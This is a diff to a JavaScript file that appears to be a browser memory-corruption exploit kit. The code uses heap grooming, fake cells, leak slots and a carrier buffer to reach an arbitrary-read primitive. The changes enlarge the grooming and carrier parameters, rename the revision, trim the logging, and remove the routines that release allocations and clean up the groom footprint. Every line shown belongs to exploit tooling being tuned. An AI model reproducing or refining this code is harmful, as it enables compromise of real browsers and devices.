@@ -1,4 +1,4 @@
-let DRAIN_COUNT = 128;
+let DRAIN_COUNT = 512;
 const AUTO_RETRY_DELAY_MS = 50;
 
 const K = 2;
@@ -19,7 +19,7 @@ const CARRIER_SLOTS = (function () {
         const n = q ? parseInt(q, 10) : 0;
         if (n >= 100000 && n <= 40000000) return n;
     } catch (e) { }
-    return 8000000;
+    return 12000000;
 })();
 const CARRIER_BYTES = CARRIER_SLOTS * 8;
 const CAPTURE_DELAY_MS = 50;
@@ -58,7 +58,7 @@ const IDENT_OFFSET = 0x20;
 const LEAK_SLOT_INDEX = 2;
 const LEAK_SLOT_OFFSET = 0x10 + 8 * LEAK_SLOT_INDEX;
 
-const REVISION = "slopkit-core-retail-15";
+const REVISION = "slopkit-core-1";
 const attemptKey = `${REVISION}:attempts`;
 
 const burstKey = `${REVISION}:burst`;
@@ -315,7 +315,6 @@ function ceilingReached() {
 
 function giveUp(reason) {
     stopped = true;
-    releaseAttemptAllocations();
     emit("CORE-GIVE-UP", `reason=${reason}-attempts=${attemptNumber}`);
     const reject = settleReject;
     settleResolve = null;
@@ -331,7 +330,6 @@ function failed() {
         return;
     }
     emit("AUTO-RETRY-AFTER-FAILURE", `attempt=${attemptNumber}`);
-    releaseAttemptAllocations();
     stopped = false;
     retryScheduled = false;
     setTimeout(() => {
@@ -504,9 +502,7 @@ function startAttempt() {
             === String(attemptNumber);
     } catch { }
     emit("ATTEMPT-START", `attempt-persisted=${attemptPersisted}`
-        + `-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`
-        + `-slots=${CARRIER_SLOTS}-drain=${DRAIN_COUNT}`
-        + `-rev=${REVISION}`);
+        + `-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`);
     try {
         buildAndStoreGraph();
 
@@ -1177,9 +1173,7 @@ function reportComposition() {
     emit("READ-PRIMITIVE-PASS", "arbitrary-read-established"
         + "-firmware-offsets-asserted=none");
 
-    dropGroomFootprintInternal();
     try { history.replaceState(null, ""); } catch { }
-    emit("GROOM-DROPPED", "auto-on-primitive-pass");
 
     stopped = true;
     running = false;
@@ -1332,39 +1326,6 @@ export function releaseFakeCell() {
 
 export function fakeCellReleased() {
     return fakeReleased;
-}
-
-function dropGroomFootprintInternal() {
-    if (fakeReleased || liveCandidate === null)
-        return false;
-    if (fillerGraph !== null) {
-        fillerGraph.length = 0;
-        fillerGraph = null;
-    }
-    if (outerGraph !== null) {
-        try { outerGraph.length = 0; } catch (_) { }
-        outerGraph = null;
-    }
-    if (keepAlive !== null) {
-        try { keepAlive.length = 0; } catch (_) { }
-        keepAlive = null;
-    }
-    keepIndex = 0;
-    getterCarrier = null;
-    preparedSymbolObject = null;
-    capturedString = null;
-    capturedWords = null;
-    referenceTarget = null;
-    leakedScope = null;
-    try { clearPredecessor(); } catch (_) { }
-    predecessorWords = null;
-    return true;
-}
-
-export function dropGroomFootprint() {
-    const ok = dropGroomFootprintInternal();
-    try { history.replaceState(null, ""); } catch (_) { }
-    return { dropped: ok, reason: ok ? null : (fakeReleased ? "released" : "no-candidate") };
 }
 
 export function carrierHeaderCopy() {
